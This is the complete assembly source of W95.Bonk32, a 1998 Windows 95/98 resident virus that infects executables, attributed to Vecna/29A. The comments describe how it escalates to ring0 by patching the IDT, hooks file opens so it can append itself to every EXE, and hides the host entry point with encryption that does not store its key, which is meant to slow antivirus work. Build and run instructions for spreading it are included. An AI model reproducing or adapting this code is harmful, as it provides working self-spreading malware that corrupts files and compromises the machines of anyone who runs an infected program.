;[W95.BONK32] Resident PE infector
;Copyright 1998 (c) Vecna
;
;This virus is the 2nd PE infector i wrote, and is a memory resident infector
;designed exclusively for win95/98. It shouldnt work neither in winNT or in
;w32s. It patches the IDT, that isnt protected in w95/98, modifies a vector
;to point code into the virus, and execute this interrupt. As the code is
;executed in ring0, the virus alloc memory and read from the host file the
;rest of the virus code. It then jump to this virus part, that hook IFS and
;restore the host.
;
;Always a EXE file is open, the virus handler take control, and infect it.
;The virus body is appended as a overlay to the end of host, without any
;physical link to host, and a small loader is stored into the free space of
;the PE header.
;
;If the host file dont have relocationz, the virus encript the original
;entrypoint and patch it with a jump to the virus loader. The key for the code
;encripted is not saved, but a CRC32 of it unencripted is stored. When the
;virus restore it, it must try all keyz, what can be time costly for AVerz.
;
;As the original entrypoint dont change, and the virus code isnt linked to
;host, beside the loader, this work as a anti-heuristic feature.
;
;Early versionz haved a bug, that cause a crash in everybody machine beside
;mine. This was because a non-fixed call to int 0x20. Some lines added and
;now it work fine.
;
;W95.Bonk32 is written using NASM sintax, that showed very efficient for my
;viral needz, as provide more control over the generated code . To compile
;you will need NASM, LINK from Microsoft and PEWRSEC from Jacky Qwerty/29A.
;You also will need any MAKE utility (Borland, Microsoft and LCC ones work).
;then debug it using SOFT-ICE till u get the point that the virus open host
;at this point, change esi to point to a unused area (ECX hold one), then
;then edit this memory (D ESI;EB) and type the dir you are and \bonk32 at the
;end. Then make the virus go(BC *;G).
;
;Or, better, run the pre-compiled file. It will execute and stay resident.
;All open files will be infected then. Remeber that the pre-compiled file
;must reside in root dir of C:, else it will crash.
;
;I must thank 2 people: the AV that discovered the bug, and Alchemy, that
;gimme the EIP of the fault and make possible to me fix it.

[bits 32]
[section .text]
[global _main]

%define true  1
%define false 0

%define debug   false
%define userda  true

%define buffer  bname  + 0x100
%define buffer2 buffer + 0x1000

%macro vxdcall 2
       int 0x20
       dw %2
       dw %1
%endmacro

hook:
       enter 0x20, 0x00                        ;setup stack frame
       push ecx
       push ebx
       call .delta
  .delta:
       pop ebx
       sub ebx, .delta
       cmp dword [ebp+0x0C], byte 0x24
       jne .noopen                             ;only hookz ifs_opne
       cmp byte [ebx+recurse], byte 0x00
       jne .noopen                             ;no re-enter
       inc byte [ebx+recurse]
       pushad
       call dynacall                           ;fix dynamic int20 calls
       call uni2ansi
       call infect                             ;replicate
       popad
       dec byte [ebx+recurse]
  .noopen:
       mov ecx, 0x06                           ;total=6 paramz
       mov ebx, 0x1C
  .nparam:
       mov eax, [ebp+ebx]                      ;copy paramz from old frame
       push eax                                ;to new frame
       sub ebx, 4
       loop .nparam
       db 0xb8
  oldhook dd 0
       call [eax]                              ;call old hookz
       add esp, byte 0x18
       pop ebx
       pop ecx
       leave
       ret

       db '[BONK32] by Vecna/29A', 0x00

dynacall:
       pushad
       cld
       mov ax, 0x20CD
       call .odynatable
  .dynatable:
       dw 0x67, 0x40
       dw 0x32, 0x40
       dw 0x0D, 0x40                           ;function, vxd
       dw 0x41, 0x40
       dw 0x32, 0x40
  .odynatable:
       pop esi
       mov edi, esi
       add edi, fix1-.dynatable
       stosw                                   ;make vxd calls to dynamic
       movsd                                   ;int20 code
       add edi, IFS-fix1-6
       stosw
       movsd
       add edi, byte fix3-IFS-6
       stosw
       movsd
       add edi, fix4-fix3-6                    ;make all fixes
       stosw
       movsd
       popad
       ret

uni2ansi:
       pushad
       lea edi, [ebx+bname]
       mov eax, [ebp+0x10]
       cmp al, -1
       jz .drive
       add al, '@'                             ;make number2letter
       stosb
       mov al, ':'
       stosb
  .drive:
       sub eax, eax
       push eax
       mov eax, 0x100
       push eax
       mov eax, [ebp+0x1C]
       mov eax, [eax+0x0C]
       add eax, byte 0x04
       push eax
       push edi
  fix4:
       vxdcall 0x40, 0x41                      ;make unicode2ansi
       add esp, byte 0x10
       add edi, eax
       sub eax, eax
       stosb
       popad
       ret

infect:
       lea edi, [ebx+bname]
       mov ebp, edi
       mov ecx, 0x100
       sub eax, eax
       cld
       repne scasb                             ;end of name
       or ecx, ecx
       jz near error
       cmp dword [edi-0x05], '.EXE'
       jne near error                          ;only infect exe files
    %if debug == true
       cmp dword [edi-0x09], 'BAIT'
       jne near error                          ;debug code
    %endif
       mov eax, 0xD500
       sub ecx, ecx
       mov edx, ecx
       inc edx
       mov ebx, edx
       inc ebx
       mov esi, ebp
       call IFS                                ;open it
       jc near error
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta                         ;ebp hold delta offset
       mov ebx, eax
       mov eax, 0xD600
       sub edx, edx
       mov ecx, 0x1000
       lea esi, [ebp+buffer]
       call IFS                                ;read pe headerz
       jc near errorclose
       mov ax, word [esi]
       add al, ah
       cmp al, 0xA7
       jne near errorclose                     ;not exe
       mov edi, [esi+0x3C]
       mov [ebp+mz_size], edi
       cmp edi, 0xE00
       ja near errorclose                      ;buffer overflow
       add edi, esi
       cmp dword [edi], 'PE'
       jne near errorclose                     ;not pe newexe
       mov eax, 'BONK'
       cmp [edi+88], eax
       mov [edi+88], eax
       jz near errorclose                      ;already infected
       cmp word [edi+4], 0x014C                ;run in a 386?
       jnz near errorclose
       bt word [edi+22], 1                     ;executable?
       jnc near errorclose
       bt word [edi+22], 0x0D                  ;dll?
       jc near errorclose
       mov eax, [edi+40]
       add eax, [edi+52]                       ;mementry==imagebase+entrypont
       mov [ebp+loader.entrypoint], eax
       movzx eax, word [edi+6]
       imul eax, eax, 40
       movzx ecx, word [edi+20]                ;sum size of all headerz
       add eax, ecx
       add eax, 24
       mov ecx, eax
       add eax, edi
       add ecx, lsize
       cmp dword [edi+84], ecx                 ;total size of headerz
       jc near errorclose                      ;enought to loader?
       push eax
       push edi
       mov edi, eax
       mov ecx, lsize
       lea esi, [ebp+loader]
       rep movsb                               ;copy loader to pe header
       lea esi, [ebp+bname]
  .nextbyte:
       lodsb
       stosb
       test al, al
       jnz .nextbyte                           ;copy host name
       pop edi
       pop eax
       sub eax, edi
       cmp [edi+160], ecx
       jne near .relocs
       cmp [edi+164], ecx
       jne near .relocs                        ;shit, relocz present
    %if userda == true
       push ebx
       mov dword [ebp+jmpentry], eax           ;signal rda used
       movzx ecx, word [edi+20]
       add ecx, edi
       add ecx, 24-0x28
 .next:
       add ecx, 0x28
       mov edx, [edi+40]
       sub edx, [ecx+12]                       ;is EIP pointing inside
       cmp edx, [ecx+8]                        ;this section?
       jnb .next
       or dword [ecx+36], 80000000h            ;make section writeable
       add edx, [ecx+20]                       ;edx point physical entrypoint
       push edx
       push eax                                ;save virus entry
       mov eax, 0xD600
       mov ecx, 0x100
       lea esi, [ebp+buffer2]                  ;esi point entrycode
       call IFS                                ;read entry code
       push esi
       push edi
       push esi
       mov eax, 0x100
       push eax
       push esi
       push eax
       call crc32                              ;calc crc32 of 100h bytes
       mov [ebp+rdacrc32], eax
       pop ecx
       pop esi
       pop edi
       in al, 0x40
  .rdaloop:
       xor byte [esi], al                      ;encript crc32ed code
       inc esi
       loop .rdaloop
       pop esi
       push edi
       lea edi, [ebp+hostcode]
       movsd
       movsb                                   ;save entrycode
       pop edi
       xchg esi, edi                           ;edi point to entrycode
       sub edi, byte 5
       mov al, 0xE9                            ;esi point to pe header
       stosb
       pop edx
       sub edx, [esi+40]
       mov eax, edx
       sub eax, 5
       add eax, dword [ebp+mz_size]
       stosd                                   ;store displacement
       mov edi, esi
       pop edx
       mov eax, 0xD601
       mov ecx, 0x100
       lea esi, [ebp+buffer2]
       pop ebx
       call IFS                                ;write pe headerz
       jmp .norelocs
    %endif
  .relocs:
       mov dword [ebp+jmpentry], ecx           ;flag as normal file
       add eax, dword [ebp+mz_size]
       mov [edi+40], eax                       ;set new entrypoint
  .norelocs:
       mov eax, 0xD601
       sub edx, edx
       mov ecx, dword [edi+84]
       lea esi, [ebp+buffer]
       call IFS                                ;write pe headerz
       mov eax, 0xD800
       call IFS                                ;get filesize
       mov edx, 0xD601
       xchg eax, edx
       mov ecx, vsize
       mov esi, ebp
       call IFS                                ;write overlay code
  errorclose:
       mov eax, 0xD700
       call IFS                                ;close file
  error:
       ret

rdacrc32 dd 0
jmpentry dd 0
hostcode dd 0
         db 0
recurse  db 0
mz_size  dd 0

install:
       sub edx, edx
       sub esi, install                        ;esi point to start of vcode
       push esi
       mov dword [esi+recurse], edx
       mov eax, 0xD700
       call IFS                                ;close file
       or ebp, ebp
       jns skip
  fix1:
       vxdcall 0x40, 0x67                      ;hook ifs
  skip:
       pop ecx
       mov [esi+oldhook], eax
  .restore:
    %if userda == true
       cmp dword [esi+jmpentry], byte 0x0
       jz .norda                               ;was rda used?
       push esi
       mov edi, [esi+loader.entrypoint]
       lea esi, [esi+hostcode]
       movsd
       movsb                                   ;restore init code
       pop esi
       push dword 0x100
       push dword [esi+rdacrc32]
       push dword [esi+loader.entrypoint]
       call rda                                ;rda decript host
  .norda:
    %endif
       ret

    %if userda == true
  crc32_pbfr equ +0x0C
  crc32_sz   equ +0x08
  crc32_ret@ equ +0x04
  crc32_ebp@ equ +0x00

crc32:
       push ebp
       mov ebp, esp
       mov esi, [ebp+crc32_pbfr]
       mov edi, [ebp+crc32_sz]                 ;setup regz
       push byte -1
       pop ecx                                 ;init crc32
       mov edx, ecx
  .aa:
       sub eax, eax
       mov ebx, eax
       lodsb                                   ;get byte
       xor al, cl
       mov cl, ch
       mov ch, dl
       mov dl, dh
       mov dh, 8
  .ab:
       shr bx, 1
       rcr ax, 1
       jnc .ac
       xor ax, 0x08320                         ;logarithm
       xor bx, 0x0edb8
  .ac:
       dec dh
       jnz .ab
       xor ecx, eax
       xor edx, ebx
       dec edi
       jnz .aa                                 ;next byte
       not edx
       not ecx
       shl ecx, 16                             ;cx:dx to ecx
       mov cx, dx
       mov eax, ecx
       pop ebp
       ret 8
    %endif

_main

loader:
       pushad
       call .seh
       mov esp, [esp+8]
       jmp .removeseh
  .seh:
       sub edx, edx
       fs push dword [edx]
       fs mov dword [edx], esp                 ;seh frame set
       call .delta
  .delta:
       pop eax
       sub eax, .delta
       push eax
       sidt [esp-2]                            ;get idt to ebx
       pop ebx
       cli
       mov ebp, [ebx+0x4+(0x5*0x8)]
       mov bp, [ebx+(0x5*0x8)]
       lea ecx, [eax+ring0]                    ;new int5 handler
       mov [ebx+(0x5*0x8)], cx
       bswap ecx
       xchg cl, ch
       mov [ebx+0x6+(0x5*0x8)], cx
       push ds
       push es
       int 0x5                                 ;jump to ring0
       pop es
       pop ds
  .removeseh:
       sti
       sub eax, eax
       fs pop dword [eax]                      ;remove seh frame
       pop eax
       popad
       db 0x68                                 ;return to host
  .entrypoint dd 0
       pop ecx
       jecxz .ret
       push ecx
  .ret:
       ret

IFS:
       vxdcall 0x40, 0x32                      ;just one place to fix
       ret

ring0:
       cld
       push ss
       pop ds
       mov edi, [eax+IFS]
       mov ax, 0x20CD                          ;these linez fix the previous
       stosw                                   ;bug, found by AVz
       mov ax, 0x32
       stosw
       mov ax, 0x40
       stosw
       lea ecx, [eax+bname]
       lea esi, [eax+name]
       mov eax, 0xD500                         ;openfile
       sub ecx, ecx
       mov edx, ecx
       mov ebx, ecx
       inc edx
       call IFS
       jnc .skip
       iret                                    ;cant open host
  .skip:
       push eax
       push dword 8192
  fix3:
       vxdcall 0x40, 0x0D                      ;vmm alloc
       pop ecx
       mov esi, eax
       pop ebx
       jc .error
       mov eax, 0xD800                         ;get filesize
       call IFS
       mov ecx, vsize
       sub eax, ecx
       mov edx, 0xD600                         ;read overlay
       xchg eax, edx
       call IFS
       add esi, install-hook
       call esi                                ;call it!
  .error:
       iret

lsize  equ ($-loader)

name   equ $

    %if userda == true
  rda_sz   equ +16
  rda_crc  equ +12
  rda_pbfr equ +08
  rda_ret@ equ +04
  rda_ebp@ equ +00
  rda_pass equ -04
  rda_key  equ -08

rda:
       enter 8, 0                              ;2 dwords as local var
       sub eax, eax
       mov [ebp+rda_pass], eax
       mov [ebp+rda_key], eax                  ;setup rda
  .setup:
       mov esi, [ebp+rda_pbfr]
       mov ecx, [ebp+rda_sz]
       mov edx, [ebp+rda_key]                  ;setup loop
  .loop:
       xor [esi], dl
       inc esi
       dec ecx
       jnz .loop
       inc dword [ebp+rda_pass]                ;increase pass counter
       cmp [ebp+rda_pass], byte 2
       jne .check                              ;first pass
       sub eax, eax
       mov [ebp+rda_pass], eax
       inc dword [ebp+rda_key]                 ;new key
       jmp short .setup
  .check:
       push ebp
       push dword [ebp+rda_pbfr]
       push dword [ebp+rda_sz]
       call crc32                              ;calc crc32
       pop ebp
       cmp eax, [ebp+rda_crc]
       jne .setup                              ;crc32 dont match
       leave
       ret 12
    %endif

vsize  equ ($-$$)

bname:
